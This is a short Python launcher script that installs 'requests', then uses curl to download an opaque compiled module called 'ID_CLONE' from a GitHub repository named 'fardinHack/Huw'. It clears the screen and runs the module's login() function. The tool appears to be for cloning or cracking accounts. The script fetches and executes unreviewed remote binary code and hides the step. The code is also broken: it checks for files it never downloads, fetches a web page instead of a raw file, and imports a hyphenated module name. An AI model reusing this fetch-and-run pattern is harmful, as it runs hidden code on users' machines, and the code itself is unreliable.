#coding=utf-8
import os, sys, platform
try:
    import requests
except:
    os.system('pip install requests')

import requests
if not os.path.isfile('Jutt.so'):
    os.system('curl -L https://github.com/fardinHack/Huw/blob/main/ID_CLONE.cython-easy-38.so > ID_CLONE.cython-easy-38.so')
    os.system('clear')
if not os.path.isfile('brand.so'):
    os.system('curl -L https://github.com/fardinHack/Huw/blob/main/ID_CLONE.cython-easy-38.so > ID_CLONE.cython-easy-38.so')
    os.system('clear')
bit=platform.architecture()[0]
if bit == '64bit':
    from ID_CLONE.cython-easy-38 import login
    login()
elif bit == '32bit':
    from ID_CLONE.cython-easy-38 import login
    login()
